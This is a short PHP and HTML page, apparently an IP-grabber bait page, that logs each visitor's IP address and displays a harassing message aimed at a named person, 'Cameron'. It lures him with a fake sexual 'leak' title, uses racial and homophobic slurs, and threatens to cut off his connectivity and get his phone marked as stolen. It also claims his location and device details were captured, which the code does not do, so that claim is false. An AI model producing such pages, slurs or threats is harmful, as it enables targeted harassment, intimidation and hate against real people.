<?php
$ip = $_SERVER['REMOTE_ADDR'];
$logFile = 'log.html';

// Format the log entry
$logEntry = date("Y-m-d H:i:s") . " - IP: " . $ip . "\n";

// Append the log entry to the log file
file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

// Display a confirmation message
echo "Visitor IP logged successfully.";
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="description" content="Come thru and watch Cameron get shit on">
  <title>Cameron Sucking DICK LEAK</title>
</head>
    <style>
        .cameron {
            font-size: 15px;
        }
    </style>

<body>
        <p class="cameron">Lol Cameron you suck, you little fuck nigga. I got your IP and your Cell Data/WiFi ain't ever gonna work again. Faggot niggas like to talk shit then faggot niggas gonna get shit on in return. <br> Your current exact GEO location has been logged aswell as most of your device info. I could prolly get your phone marked as "stolen", WHO KNOWS :)</p>
        <h2> stay in your place lil nigga</h2>
    </body>
</html>